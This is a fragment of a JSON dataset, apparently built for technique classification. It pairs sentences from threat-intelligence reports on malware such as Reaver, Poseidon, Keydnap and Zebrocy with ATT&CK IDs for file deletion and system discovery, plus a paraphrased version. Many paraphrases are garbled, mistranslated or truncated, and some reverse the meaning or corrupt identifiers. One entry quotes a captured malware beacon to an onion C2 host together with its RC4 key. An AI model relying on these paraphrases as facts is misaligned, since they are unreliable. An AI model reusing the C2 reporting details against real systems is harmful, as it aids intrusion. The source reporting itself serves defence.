            "tec_id": "T1070.004",
            "en_text": "The message sent to the C2 will be “file is deleted.” if successful or “file is not deleted.” if unsuccessful",
            "data_text": "The message sent to C2 is \"file is delete\" if successful and \"file is not delete\" if failure."
        }
    ],
    "Deletes existing file": [
        {
            "tec_id": "T1070.004",
            "en_text": "Deletes existing file",
            "data_text": "Delete the existing file."
        }
    ],
    "The dropped executable (MD5: 78734CD268E5C9AB4184E1BBE21A6EB9) contains the compressed FELIXROOT dropper component in the Portable Executable (PE) binary overlay section": [
        {
            "tec_id": "T1070.004",
            "en_text": "The dropped executable (MD5: 78734CD268E5C9AB4184E1BBE21A6EB9) contains the compressed FELIXROOT dropper component in the Portable Executable (PE) binary overlay section",
            "data_text": "Deleted executable (MD5:78734)CD268E5C9AB4184E1BBE21A6EB9) contains the compressed FELEXROOT dropper component in the Portable Executable (PE) Binary Overlay section."
        }
    ],
    "The dropper will delete itself at the end of the process": [
        {
            "tec_id": "T1070.004",
            "en_text": "The dropper will delete itself at the end of the process",
            "data_text": "The dropper is automatically deleted at the end of the process."
        }
    ],
    "After this file is copied, the original ‘Update.~tmp’ file is deleted": [
        {
            "tec_id": "T1070.004",
            "en_text": "After this file is copied, the original ‘Update.~tmp’ file is deleted",
            "data_text": "Perform an original 'update' after this file has been copied.The file '~tmp' has been deleted."
        }
    ],
    "In the event it does, Reaver will move this file to ‘%TEMP%\\~FJIOW.tmp’ and delete this new file": [
        {
            "tec_id": "T1070.004",
            "en_text": "In the event it does, Reaver will move this file to ‘%TEMP%\\~FJIOW.tmp’ and delete this new file",
            "data_text": "In this case, Reaver moves this file to '%TEMP%\\~FJ'.Delete IOW.tmp' and this new file"
        }
    ],
    "boom! Deletes GID.bin, ShwDoc.VBS and ShwDoc.srv files, as well as the scheduled task whose name a GUID stored in the GID.bin file": [
        {
            "tec_id": "T1070.004",
            "en_text": "boom! Deletes GID.bin, ShwDoc.VBS and ShwDoc.srv files, as well as the scheduled task whose name a GUID stored in the GID.bin file",
            "data_text": "Bang! Delete GID.bin, ShwDoc.Scheduled task with VBS and ShwDoc.srv files and GUID names stored in the GID.bin file"
        }
    ],
    "Also, the x command will delete the generated registry key and the Office365DCOMCheck/SystemDiskClean scheduled task": [
        {
            "tec_id": "T1070.004",
            "en_text": "Also, the x command will delete the generated registry key and the Office365DCOMCheck/SystemDiskClean scheduled task",
            "data_text": "The x command also deletes the generated registry keys and Office365DCOMCheck/SystemDiskClean scheduled tasks."
        }
    ],
    "After running the malware, the batch script goes on to cleans up all signs of its existence on the system, this includes:  Deletion of all initial files created during installation, as well as all associated files required on disk during initial execution": [
        {
            "tec_id": "T1070.004",
            "en_text": "After running the malware, the batch script goes on to cleans up all signs of its existence on the system, this includes:  Deletion of all initial files created during installation, as well as all associated files required on disk during initial execution",
            "data_text": "After running the malware, the batch script cleans up all the signs that exist in the system. This includes: Delete all initial files created during installation and all associated files required on disk during initial run"
        }
    ],
    "Kaspersky Lab products detect the malware used by Poseidon Group with the following detection names: Backdoor.Win32.Nhopro HEUR:Backdoor.Win32.Nhopro.gen HEUR:Hacktool.Win32.Nhopro.gen How many victims have you found? At least 35 victim companies have been identified with primary targets including financial and government institutions, telecommunications, manufacturing, energy and other service utility companies, as well as media and public relations firms": [
        {
            "tec_id": "T1070.004",
            "en_text": "Kaspersky Lab products detect the malware used by Poseidon Group with the following detection names: Backdoor.Win32.Nhopro HEUR:Backdoor.Win32.Nhopro.gen HEUR:Hacktool.Win32.Nhopro.gen How many victims have you found? At least 35 victim companies have been identified with primary targets including financial and government institutions, telecommunications, manufacturing, energy and other service utility companies, as well as media and public relations firms",
            "data_text": "The Kaspersky Lab product detects malware used by the Poseidon group with the following detection names: Back door. Win32. Nhopro HEUR: Back door.Win32.Nhopro.gen HEUR: Nuclear tools.Win32.Nhopro.gen How many victims did you find? At least 35 victims, including finance, government agencies, telecommunications, manufacturing, energy and other service utility companies, media and public relations companies, have been identified as major targets."
        }
    ],
    "This system configuration file (in.sys) will drop a backdoor installer (UserInstall.exe) then delete itself": [
        {
            "tec_id": "T1070.004",
            "en_text": "This system configuration file (in.sys) will drop a backdoor installer (UserInstall.exe) then delete itself",
            "data_text": "This system configuration file (in.sys) deletes the backdoor installer (UserInstall.exe) and then deletes itself"
        }
    ],
    "Both “%APPDATA%\\\\Microsoft\\Windows\\Cookies.txt” and “%APPDATA%\\\\Microsoft\\Windows\\Cookies.exe” are then deleted": [
        {
            "tec_id": "T1070.004",
            "en_text": "Both “%APPDATA%\\\\Microsoft\\Windows\\Cookies.txt” and “%APPDATA%\\\\Microsoft\\Windows\\Cookies.exe” are then deleted",
            "data_text": "%APPDA Both TA%\\\\Microsoft\\Windows\\Cookies.txt and %APPDATA%\\\\Microsoft\\Windows\\Cookies.exe\" will be deleted."
        }
    ],
    "Once they are deleted by the attackers’ code, there is nothing left to be forensically recovered.": [
        {
            "tec_id": "T1070.004",
            "en_text": "Once they are deleted by the attackers’ code, there is nothing left to be forensically recovered.",
            "data_text": "Once deleted by the attacker's code, there is nothing forensic recoverable left."
        }
    ],
    "and then deletes the original launcher": [
        {
            "tec_id": "T1070.004",
            "en_text": "and then deletes the original launcher",
            "data_text": "Delete the original launcher."
        }
    ],
    "Size Expansion of Configuration Information PlugX is designed to run based on its configuration information stored in itself": [
        {
            "tec_id": "T1082",
            "en_text": "Size Expansion of Configuration Information PlugX is designed to run based on its configuration information stored in itself",
            "data_text": "The size extension of the Configuration Information Plug X is designed to run based on self-stored configuration information."
        }
    ],
    "This version of the campaign made malicious use of unins000.exe, a process that belongs to the Brazilian information security company GAS Tecnologia, to gather personal information undetected": [
        {
            "tec_id": "T1082",
            "en_text": "This version of the campaign made malicious use of unins000.exe, a process that belongs to the Brazilian information security company GAS Tecnologia, to gather personal information undetected",
            "data_text": "A version of this campaign maliciously used unins000.exe, a process by Brazilian information security company GAS Tecnologia, to collect undetected personal information."
        }
    ],
    "The autonomous system name of the IP shows that the allocation is controlled by Serverius Holding B.V., which is an autonomous system name we have previously seen associated with the OilRig group": [
        {
            "tec_id": "T1082",
            "en_text": "The autonomous system name of the IP shows that the allocation is controlled by Serverius Holding B.V., which is an autonomous system name we have previously seen associated with the OilRig group",
            "data_text": "The autonomous system name of IP indicates that the assignment is controlled by Serverius Holding B.V., the autonomous system name previously associated with the OilRig group."
        }
    ],
    "OSinfo: OSInfo is a general purpose, system information gathering tool": [
        {
            "tec_id": "T1082",
            "en_text": "OSinfo: OSInfo is a general purpose, system information gathering tool",
            "data_text": "OSinfo: OSInfo is a universal system information gathering tool."
        }
    ],
    "This backdoor collects system information, including the operating system version and hostname, and includes functionality to check, upload, and register plugins that can further enhance its capabilities": [
        {
            "tec_id": "T1082",
            "en_text": "This backdoor collects system information, including the operating system version and hostname, and includes functionality to check, upload, and register plugins that can further enhance its capabilities",
            "data_text": "This backdoor collects system information, including operating system versions and host names, and includes the ability to scan, upload, and register plug-ins that can further enhance functionality."
        }
    ],
    "The data above contains the hostname (‘HOSTNAME-PC’) of the victim machine, as well as an instruction": [
        {
            "tec_id": "T1082",
            "en_text": "The data above contains the hostname (‘HOSTNAME-PC’) of the victim machine, as well as an instruction",
            "data_text": "The data above contains the host name ('HOSTNAME-PC') of the victim machine and the command."
        }
    ],
    "To obtain a job, the Trojan builds a subdomain that has the following structure and issues a DNS query to the C2 server: c<unique identifier><job identifier padded with ‘0’ to make three digits><sequence number>c The generated subdomain is then subjected to a number-to-character substitution function that is the inverse of the Table 4, which effectively converts all the digits in the subdomain into characters": [
        {
            "tec_id": "T1082",
            "en_text": "To obtain a job, the Trojan builds a subdomain that has the following structure and issues a DNS query to the C2 server: c<unique identifier><job identifier padded with ‘0’ to make three digits><sequence number>c The generated subdomain is then subjected to a number-to-character substitution function that is the inverse of the Table 4, which effectively converts all the digits in the subdomain into characters",
            "data_text": "To obtain the task, the Trojan creates a subdomain with the following structure and runs a DNS query on the C2 server: c<Unique identifier><Task identifier padded with '0' to create a three-digit number><sequence number>c The generated subdomain is affected by the inverse numeric-to-character substitution function in Table 4.Converts all numbers in a subdomain to characters."
        }
    ],
    "Once the second DLL is executed, it gathers information about the victim system’s setup, such as operating system version, and driver and processor information": [
        {
            "tec_id": "T1082",
            "en_text": "Once the second DLL is executed, it gathers information about the victim system’s setup, such as operating system version, and driver and processor information",
            "data_text": "When the second DLL runs, it collects information about the settings of the target system, such as operating system version, driver, and processor information."
        }
    ],
    "System owners are also advised to run the YARA tool on any system they suspect to have been targeted by HIDDEN COBRA actors": [
        {
            "tec_id": "T1082",
            "en_text": "System owners are also advised to run the YARA tool on any system they suspect to have been targeted by HIDDEN COBRA actors",
            "data_text": "System owners are also advised to run the YARA tool on all systems suspected of being targeted by HIDDEN COBRA actors."
        }
    ],
    "One computer that was infected with both Cadelspy and Remexi was a system that ran a SIM card editing application": [
        {
            "tec_id": "T1082",
            "en_text": "One computer that was infected with both Cadelspy and Remexi was a system that ran a SIM card editing application",
            "data_text": "One computer infected with both Cadelspy and Remexi was a system that ran SIM card editing applications."
        }
    ],
    "Cadelspy initially arrives on the computer as a dropper, which downloads two installer components catering to whether the victim is running a 32-bit or 64-bit system": [
        {
            "tec_id": "T1082",
            "en_text": "Cadelspy initially arrives on the computer as a dropper, which downloads two installer components catering to whether the victim is running a 32-bit or 64-bit system",
            "data_text": "Cadelspy initially arrives at the computer as a dropper downloading two installer components, depending on whether you are running a 32-bit or 64-bit system."
        }
    ],
    "Other functionalities provided by this section of the PowerShell Script are as follows:  Retrieves the following data from the system by leveraging Windows Management Instrumentation (WMI) queries and environment variables: IP Address from Network Adapter Configuration OS Name OS Architecture Computer Name Computer Domain Name Username    All of this data is concatenated and formatted as shown in Figure 13:    Figure 13: Concatenated and formatted data retrieved by PowerShell script  Register the victim’s machine to the C2 server by sending the REGISTER command to the server": [
        {
            "tec_id": "T1082",
            "en_text": "Other functionalities provided by this section of the PowerShell Script are as follows:  Retrieves the following data from the system by leveraging Windows Management Instrumentation (WMI) queries and environment variables: IP Address from Network Adapter Configuration OS Name OS Architecture Computer Name Computer Domain Name Username    All of this data is concatenated and formatted as shown in Figure 13:    Figure 13: Concatenated and formatted data retrieved by PowerShell script  Register the victim’s machine to the C2 server by sending the REGISTER command to the server",
            "data_text": "Other features that this section of the PowerShell script provides are: Leverage Windows Management Instrumentation (WMI) queries and environment variables to retrieve the following data from your system: Network Adapter Configuration OS Name OS Architecture Computer Name Computer Domain Name Username All of this data is shown in Figure 13: Figure 13: Send REGISTER commands to register the connection and formatted data retrieved by the PowerShell script with the C2 server.eServer"
        }
    ],
    "Freenki is used to gather information about the infected system and to download a subsequent stage payload": [
        {
            "tec_id": "T1082",
            "en_text": "Freenki is used to gather information about the infected system and to download a subsequent stage payload",
            "data_text": "Freenki is used to gather information about infected systems and download subsequent step payloads."
        }
    ],
    "The information this malware collected included the following:The computer nameThe usernameThe execution path of the sampleThe BIOS modelA randomly-generated ID to uniquely identify the systemGroup123 utilized this method to ensure their victim was (a) someone they wanted to target further and (b) someone they could infect further based on the information obtained from the reconnaissance phase": [
        {
            "tec_id": "T1082",
            "en_text": "The information this malware collected included the following:The computer nameThe usernameThe execution path of the sampleThe BIOS modelA randomly-generated ID to uniquely identify the systemGroup123 utilized this method to ensure their victim was (a) someone they wanted to target further and (b) someone they could infect further based on the information obtained from the reconnaissance phase",
            "data_text": "The information collected by this malware is as follows:Run Path to Computer Name Username Sample BIOS Model A used this method to uniquely identify System Group123 with randomly generated IDs to determine that the victim is (a) a person who wants to target more targets and (b) a person who can cause more infections based on information from the reconnaissance phase."
        }
    ],
    "You can see that in addition to the code, the author copy-pasted English typos such as \"IE Registery\":PDB PathsWe can clearly identify a pattern in the PDB naming convention of all the binaries mentioned in this article.ROKRAT:e:\\Happy\\Work\\Source\\version 12\\T+M\\Result\\DocPrint.pdb (from the \"Evil New Year\" campaign)d:\\HighSchool\\version 13\\2ndBD\\T+M\\T+M\\Result\\DocPrint.pdb (from the \"North Korean Human Rights\" campaignD:\\HighSchool\\version 13\\First-Dragon(VS2015)\\Sample\\Release\\DogCall.pdb (ROKRAT Sample from an unidentified campaign from June)Wiper:D:\\HighSchool\\version 13\\VC2008(Version15)\\T+M\\T+M\\TMProject\\Release\\ErasePartition.pdb (From the \"Are You Happy?\" campaign)Summary GraphHere is a graph to visualize the similarities and differences between each campaign mentioned in this article:ConclusionSouth Korea is becoming an important target for malicious actors and the techniques used are becoming specific to the region (for example: use of native language to try and ensure the targets feel that the information, document or email being sent to them has added legitimacy)": [],
    "After connecting to the IRC server, the MPK bot sends custom ping messages and provides an introduction via a “!Hello” message that contains the current logged in user of the infected host, if the user has administrator privileges, the hostname, the UUID of the system, and operating system version": [
        {
            "tec_id": "T1082",
            "en_text": "After connecting to the IRC server, the MPK bot sends custom ping messages and provides an introduction via a “!Hello” message that contains the current logged in user of the infected host, if the user has administrator privileges, the hostname, the UUID of the system, and operating system version",
            "data_text": "After connecting to the IRC server, the MPK bot sends a custom ping message and says \"!Hello\" message containing the currently logged in user (if you have administrator privileges) of the infected host, the hostname, the UUID of the system, and"
        }
    ],
    "The malware queries the Windows API to get the computer name, user name, volume serial number, Windows version, processor architecture and two additional values, which are “1.3” and “KdfrJKN”": [
        {
            "tec_id": "T1082",
            "en_text": "The malware queries the Windows API to get the computer name, user name, volume serial number, Windows version, processor architecture and two additional values, which are “1.3” and “KdfrJKN”",
            "data_text": "The malware queries the Windows API for two additional values: computer name, user name, volume serial number, Windows version, processor architecture, and \"1.3\" and \"KdfrJKN\"."
        }
    ],
    "Parameter   Description    ‘u=’  This parameter contains target machine information in the following format: <Computer Name>, <User Name>, <Windows Versions>, <Processor Architecture>, <1.3>, < KdfrJKN >, <Volume Serial Number>    ‘&h=’  This parameter includes the information about the command executed and its results": [
        {
            "tec_id": "T1082",
            "en_text": "Parameter   Description    ‘u=’  This parameter contains target machine information in the following format: <Computer Name>, <User Name>, <Windows Versions>, <Processor Architecture>, <1.3>, < KdfrJKN >, <Volume Serial Number>    ‘&h=’  This parameter includes the information about the command executed and its results",
            "data_text": "Parameter Description 'u=' This parameter contains target system information in the format <computer name>, <user name>, <Windows version>, <processor architecture>, <1.3>, <KdfrJKN>, <volume serial number>."
        }
    ],
    "The rest of MirageFox functions similarly to previous malware created by APT15, first collecting information about the computer like the username, CPU information, architecture, and so forth": [
        {
            "tec_id": "T1082",
            "en_text": "The rest of MirageFox functions similarly to previous malware created by APT15, first collecting information about the computer like the username, CPU information, architecture, and so forth",
            "data_text": "The rest of MirageFox works similar to the old malware created by APT15, and first collects information about computers, such as user names, CPU information, architecture, and so on."
        }
    ],
    "infoClient is reponsible for collecting OS info, submitting this info to its C&C servers (the servers are malicious in nature), and receiving additional C&C communication information": [
        {
            "tec_id": "T1082",
            "en_text": "infoClient is reponsible for collecting OS info, submitting this info to its C&C servers (the servers are malicious in nature), and receiving additional C&C communication information",
            "data_text": "The infoClient is responsible for collecting OS information and submitting it to C."
        }
    ],
    "The HandlePP::getClientID method uses the following environment variables:   Figure 11. Serial number   Figure 12. Hardware UUID   Figure 13. MAC address   Figure 14. Randomly generated UUID For the initial information packet, the backdoor also collects the following:   Figure 15. OS version Running getpwuid ->pw_name , scutil – -get ComputerName, and uname –m will provide the following returns respectively:  Mac OSX 10.12": [
        {
            "tec_id": "T1082",
            "en_text": "The HandlePP::getClientID method uses the following environment variables:   Figure 11. Serial number   Figure 12. Hardware UUID   Figure 13. MAC address   Figure 14. Randomly generated UUID For the initial information packet, the backdoor also collects the following:   Figure 15. OS version Running getpwuid ->pw_name , scutil – -get ComputerName, and uname –m will provide the following returns respectively:  Mac OSX 10.12",
            "data_text": "The HandlePP::getClientID method uses the following environment variables: Figure 11. Serial Number Figure 12. Hardware UUID Figure 13. MAC Address Figure 14. For randomly generated UUID initial information packets, the backdoor also collects: Figure 15. During OS version execution, getpuid -> pw_name, scutil – -getComputerName and unname –m each provide the following returns: Mac OS X 10.12"
        }
    ],
    "As we can see, the following information is present within this configuration:  Remote Command and Control (C2) server Remote port Sleep timer  Reaver continues to collect various information from the victim machine, including the following:  CPU speed Computer name Username IP Address Microsoft Windows version Physical and virtual memory information  The malware proceeds to communicate with the remote server via HTTP GET and POST requests": [
        {
            "tec_id": "T1082",
            "en_text": "As we can see, the following information is present within this configuration:  Remote Command and Control (C2) server Remote port Sleep timer  Reaver continues to collect various information from the victim machine, including the following:  CPU speed Computer name Username IP Address Microsoft Windows version Physical and virtual memory information  The malware proceeds to communicate with the remote server via HTTP GET and POST requests",
            "data_text": "As you can see, this configuration contains the following information: Remote Command and Control (C2) Server Remote Port Sleep Timer Reaver continues to collect a variety of information from the victim's system, including:CPU Speed Computer Name Username IP Address Microsoft Windows Version Physical and Virtual Memory Information Malware continues to communicate with the remote server over HTTP GETAN.d POST Request"
        }
    ],
    "Reaver continues to collect various information from the victim machine, including the following:  Computer name Volume serial number Microsoft Windows version CPU speed ANSI code page OEM code page identifier for the operating system Physical and virtual memory information  Reaver encrypts this data using an incremental XOR key and uploads it to the configured remote server on the port specified": [
        {
            "tec_id": "T1082",
            "en_text": "Reaver continues to collect various information from the victim machine, including the following:  Computer name Volume serial number Microsoft Windows version CPU speed ANSI code page OEM code page identifier for the operating system Physical and virtual memory information  Reaver encrypts this data using an incremental XOR key and uploads it to the configured remote server on the port specified",
            "data_text": "Reaver continues to gather a variety of information from the victim's system, including: Computer Name Volume Serial Number The OEM Code Page Identifier Physical and Virtual Memory Information Reaver for the Microsoft Windows version CPU speed ANSI code page operating system encrypts this data using an incremental XOR key and then uploads it to a configured remote server on the specified port."
        }
    ],
    "Here is an example of the result of ps ax on an infected system:       $ ps ax[...] 566 ?? Ss 0:00.01 /usr/libexec/icloudsyncd -launchd netlogon.bundle[...]     Figure 8: Result of ps ax on an infected system Keychain stealing The OSX/Keydnap backdoor is equipped with a mechanism to gather and exfiltrate passwords and keys stored in OS X’s keychain": [
        {
            "tec_id": "T1082",
            "en_text": "Here is an example of the result of ps ax on an infected system:       $ ps ax[...] 566 ?? Ss 0:00.01 /usr/libexec/icloudsyncd -launchd netlogon.bundle[...]     Figure 8: Result of ps ax on an infected system Keychain stealing The OSX/Keydnap backdoor is equipped with a mechanism to gather and exfiltrate passwords and keys stored in OS X’s keychain",
            "data_text": "The following example shows the results of pax on an infected system: $ $ psax[...] 566 ? SS 0:00.01 /usr/libexec/icloudsyncd -launchd netlogon.bundle[...] Figure 8: Results of pax on infected systems The keychain theft OS X/Keydnap backdoor is equipped with a mechanism to collect and illuminate passwords and keys stored in the keychain of OS X."
        }
    ],
    "POST /api/osx/started HTTP/1.1Host: r2elajikcosf7zee.onion.toAccept: */*Content-Length: 233Content-Type: application/x-www-form-urlencodedbot_id=9a8965ba04e72909f36c8d16aa801794c6d905d045c2b704e8f0a9bbb97d3eb8&amp;data=psX0DKYB0u...5TximyY%2BQY%3D     Figure 10: Malware sending initial information       &gt; rc4decrypt(base64decode(\"psX0DKYB0u...5TximyY+QY=\"), \"u2RLhh+!LGd9p8!ZtuKcN\")device_model=MacBookPro9,2bot_version=1.3.5build_name=elitef*ckos_version=15.5.0ip_address=4.5.6.7has_root=0     Figure 11: Decoded data sent to C&C The bot_id is constructed by hashing the following values with SHA-256:  The hardware UUID (IOPlatformUUID) The system serial number (IOPlatformSerialNumber) The model identifier of the Mac (e.g.: MacBookPro9,2)  Most actions are self-explanatory": [
        {
            "tec_id": "T1082",
            "en_text": "POST /api/osx/started HTTP/1.1Host: r2elajikcosf7zee.onion.toAccept: */*Content-Length: 233Content-Type: application/x-www-form-urlencodedbot_id=9a8965ba04e72909f36c8d16aa801794c6d905d045c2b704e8f0a9bbb97d3eb8&amp;data=psX0DKYB0u...5TximyY%2BQY%3D     Figure 10: Malware sending initial information       &gt; rc4decrypt(base64decode(\"psX0DKYB0u...5TximyY+QY=\"), \"u2RLhh+!LGd9p8!ZtuKcN\")device_model=MacBookPro9,2bot_version=1.3.5build_name=elitef*ckos_version=15.5.0ip_address=4.5.6.7has_root=0     Figure 11: Decoded data sent to C&C The bot_id is constructed by hashing the following values with SHA-256:  The hardware UUID (IOPlatformUUID) The system serial number (IOPlatformSerialNumber) The model identifier of the Mac (e.g.: MacBookPro9,2)  Most actions are self-explanatory",
            "data_text": "POST /api/osx/Start HTTP/1.1 Host: r2elajikcosf7zee.onion.to Accept: */*Content Length: 233 Content-Type: application/x-www-form-urlencodedbot_id=9a8965ba04e72909f36c8d16a801794c6d905d0452ba09709ba09709ba09ba09ba09"
        }
    ],
    "Additional information For more information about the attacks and the indicators of compromise, please contact: intelreports@kaspersky.com Alternatively, please visit: https://www.kaspersky.com/enterprise-security/apt-intelligence-reporting To find more information about cybersecurity awareness training for enterprise or government staff, go to Kaspersky Security Awareness": [
        {
            "tec_id": "T1082",
            "en_text": "Additional information For more information about the attacks and the indicators of compromise, please contact: intelreports@kaspersky.com Alternatively, please visit: https://www.kaspersky.com/enterprise-security/apt-intelligence-reporting To find more information about cybersecurity awareness training for enterprise or government staff, go to Kaspersky Security Awareness",
            "data_text": "Additional Information For more information about attacks and any signs of damage, contact: Visit intelreports@kaspersky.com or the following website: https://www.kaspersky.com/enterprise-security/apt-intelligence-reporting For more information on cybersecurity awareness training for corporate or government employees, go to Kas.Better security awareness"
        }
    ],
    "This information allows a threat actor to determine if their messages were delivered, which users are more susceptible to opening them, and basic information regarding the target’s operating system and e-mail client (or browser)": [
        {
            "tec_id": "T1082",
            "en_text": "This information allows a threat actor to determine if their messages were delivered, which users are more susceptible to opening them, and basic information regarding the target’s operating system and e-mail client (or browser)",
            "data_text": "This information allows threatening agents to determine whether a message has been forwarded, the operating system of users and targets that are easy to open the message, and basic information about the email client (or browser)."
        }
    ],
    "This phase will often leverage a specialized tool that automatically collects a wide array of information including credentials, group management policies, and even system logs to better hone further attacks and assure execution of their malware": [
        {
            "tec_id": "T1082",
            "en_text": "This phase will often leverage a specialized tool that automatically collects a wide array of information including credentials, group management policies, and even system logs to better hone further attacks and assure execution of their malware",
            "data_text": "This step often leverages specialized tools to automatically collect a variety of information, including credentials, group management policies, and even system logs, to enhance further attacks and ensure that malware runs."
        }
    ],
    "A noteworthy addition to the Poseidon toolkit is the IGT supertool (Information Gathering toolkit), a bulking 15 megabyte executable that orchestrates a series of different information collections steps, exfiltration, and the cleanup of components": [
        {
            "tec_id": "T1082",
            "en_text": "A noteworthy addition to the Poseidon toolkit is the IGT supertool (Information Gathering toolkit), a bulking 15 megabyte executable that orchestrates a series of different information collections steps, exfiltration, and the cleanup of components",
            "data_text": "Notable addition to the Poseidon Toolkit is the IGT SuperGathering Toolkit, a large 15-megabyte executable that coordinates a series of different information collection steps, filtration, and component cleanup."
        }
    ],
    "The main purpose of the IGT tool is to make an inventory of the system, saving information from the network interfaces and addresses, credentials belonging to the Domain and database server, services being run from the OS and everything that could help the Poseidon Group make its attack more customized to its victim": [
        {
            "tec_id": "T1082",
            "en_text": "The main purpose of the IGT tool is to make an inventory of the system, saving information from the network interfaces and addresses, credentials belonging to the Domain and database server, services being run from the OS and everything that could help the Poseidon Group make its attack more customized to its victim",
            "data_text": "The main purpose of the IGT tool is to inventory the system and store network interfaces and addresses, credentials belonging to domain and database servers, services running on the OS, and everything that helps Poseidon groups more customize the attack target."
        }
    ],
    "Is this a Windows-only threat? Which versions of Windows are targeted? Poseidon is particularly focused on the Microsoft Windows operating system family, specifically customizing the infection method for each one so as to gather different information and hide its presence after the initial infection": [
        {
            "tec_id": "T1082",
            "en_text": "Is this a Windows-only threat? Which versions of Windows are targeted? Poseidon is particularly focused on the Microsoft Windows operating system family, specifically customizing the infection method for each one so as to gather different information and hide its presence after the initial infection",
            "data_text": "Is this a Windows-only threat? What is the target version of Windows? Poseidon specifically focuses on the Microsoft Windows operating system family, customizing each infection method to gather other information and hide its existence after the initial infection."
        }
    ],
    "A multilayered approach is a must to securing the organization’s perimeter, especially for information security professionals and system/IT administrators": [
        {
            "tec_id": "T1082",
            "en_text": "A multilayered approach is a must to securing the organization’s perimeter, especially for information security professionals and system/IT administrators",
            "data_text": "In particular, for information security professionals and systems, a multi-layered approach is essential to protect organizational boundaries.IT Administrator"
        }
    ],
    "This variation of the Zebrocy downloader begins by gathering the serial number for the storage volume with the label “C:\\” and the computer name": [
        {
            "tec_id": "T1082",
            "en_text": "This variation of the Zebrocy downloader begins by gathering the serial number for the storage volume with the label “C:\\” and the computer name",
            "data_text": "This variant of the Zebrocy downloader begins by collecting serial numbers of storage volumes with the \"C:\\\" label and computer name."
        }
    ],
    "Two of them are MacOS X User-Agents and the third is a hashed string:  Mozilla/5.0 (iPad; U; CPU OS 3_2_1 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Mobile/BADDAD Mozilla/5.0 (iPad; U; CPU OS 3_2_1 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Mobile/7B405   E9BC3BD76216AFA560BFB5ACAF5731A3   Figure 5: SpeakUp `s requests are encrypted with the salted base64 and include the unique User-Agent At the moment SpeakUp serves XMRig miners to its listening infected servers": [
        {
            "tec_id": "T1082",
            "en_text": "Two of them are MacOS X User-Agents and the third is a hashed string:  Mozilla/5.0 (iPad; U; CPU OS 3_2_1 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Mobile/BADDAD Mozilla/5.0 (iPad; U; CPU OS 3_2_1 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Mobile/7B405   E9BC3BD76216AFA560BFB5ACAF5731A3   Figure 5: SpeakUp `s requests are encrypted with the salted base64 and include the unique User-Agent At the moment SpeakUp serves XMRig miners to its listening infected servers",
            "data_text": "Two are Mac OS X user agents and the third is a hash string: Mozilla/5.0 (iPad; U; CPU OS 3_2_1; enus such as Mac OS X) Apple Webkit/531.21.10 (like KHTML, Gekko) Mobile/B.ADD Mozilla/5.0 (iPad; U; CPU OS 3_2_1; en-us such as Mac OS X) Apple WebKit/531.21.10 (KHTML such as KHTML, Gecko) Mobile/7B405 E9BC3BD76216AFA560BB5ACAF531A3AkPease requests are encrypted to the user's XUgase server."
        }
    ],
    "Download & execute Startup (with persistence) Collection of system information (OS, version, installed location, etc.) Self-update Uninstall  This project was created by a user called zettabithf which is linked to a user with the same name in Hack Forums": [
        {
            "tec_id": "T1082",
            "en_text": "Download & execute Startup (with persistence) Collection of system information (OS, version, installed location, etc.) Self-update Uninstall  This project was created by a user called zettabithf which is linked to a user with the same name in Hack Forums",
            "data_text": "Download."
        }
    ],
    "Low confidence generally means that the information's credibility and/or plausibility is questionable, or that the information is too fragmented or poorly corroborated to make solid analytic inferences, or that [there are] significant concerns or problems with the sources": [
        {
            "tec_id": "T1082",
            "en_text": "Low confidence generally means that the information's credibility and/or plausibility is questionable, or that the information is too fragmented or poorly corroborated to make solid analytic inferences, or that [there are] significant concerns or problems with the sources",
            "data_text": "Poor reliability generally means that the reliability and/or validity of the information is questionable, that the information is too fragmented or poorly demonstrated to make a solid analytical inference, or that the source has significant concerns or problems."
        }
    ],
    "URL parameter Sample data Description   c= Victim->Administrator Hostname and username   l= 192.168.1.100 Compromised system's IP address   o= 5,1,1,32 Windows major and minor version, coupled with architecture (32 v": [
        {
            "tec_id": "T1082",
            "en_text": "URL parameter Sample data Description   c= Victim->Administrator Hostname and username   l= 192.168.1.100 Compromised system's IP address   o= 5,1,1,32 Windows major and minor version, coupled with architecture (32 v",
            "data_text": "URL Parameter Sample Data Description c = Victim-> Administrator Hostname and User Name l = 192.168.1.100 IP Addresses of Corrupted Systems o = 5,1,1,32 Windows Major and Minor Versions, Combined with Architecture (32v)"
        }
    ],
    "The verb get can be used in a myriad of ways to retrieve information for a machine, however in this case os get /format: is being abused to download payloads from non-local resources with .xsl extensions": [
        {
            "tec_id": "T1082",
            "en_text": "The verb get can be used in a myriad of ways to retrieve information for a machine, however in this case os get /format: is being abused to download payloads from non-local resources with .xsl extensions",
            "data_text": "The verb get can be used to retrieve information about your computer, but in this case osget/format: is used to download payloads from non-local resources with .xsl extensions."
        }
    ],
    "Revenge RAT is a simple and freely available Remote Access Trojan that automatically gathers system information before allowing threat actors to remotely access system components such as webcams, microphones, and various other utilities": [
        {
            "tec_id": "T1082",
            "en_text": "Revenge RAT is a simple and freely available Remote Access Trojan that automatically gathers system information before allowing threat actors to remotely access system components such as webcams, microphones, and various other utilities",
            "data_text": "REVANGE RAT is a simple, freely available remote access Trojan that automatically collects system information before threatening agents remotely access system components such as webcams, microphones, and various other utilities."
        }
    ],
    "itwm= ags= oe= aq= btnG= oprnd= itwm= utm= channel= The XAgent OSX Trojan generates a system specific value that it refers to as an “agent_id”, which is a unique identifier for each compromised host": [
        {
            "tec_id": "T1082",
            "en_text": "itwm= ags= oe= aq= btnG= oprnd= itwm= utm= channel= The XAgent OSX Trojan generates a system specific value that it refers to as an “agent_id”, which is a unique identifier for each compromised host",
            "data_text": "The itwm=ags=oe=aq=btnG=oprnd=itwm=utm=channel=XAgentOSX Trojan generates a system-specific value referred to as \"agent_id,\" a unique identifier for each compromised host."
        }
    ],
    "The value is derived using the IOService to access the IOPlatformUUID property, which is equivalent to the “Hardware UUID” listed in the system information application, as seen in the Figure 3 screenshot of our analysis system": [
        {
            "tec_id": "T1082",
            "en_text": "The value is derived using the IOService to access the IOPlatformUUID property, which is equivalent to the “Hardware UUID” listed in the system information application, as seen in the Figure 3 screenshot of our analysis system",
            "data_text": "This value is used to access the IOP platform using the IOS service.UUID properties, which are identical to the \"hardware UUID\" listed in the System Information application, as shown in the Figure 3 screenshot of the analysis system."
        }
    ],
    "The Trojan uses the first four bytes of this hardware ID as a unique identifier for the system, which in our case was “0000”": [
        {
            "tec_id": "T1082",
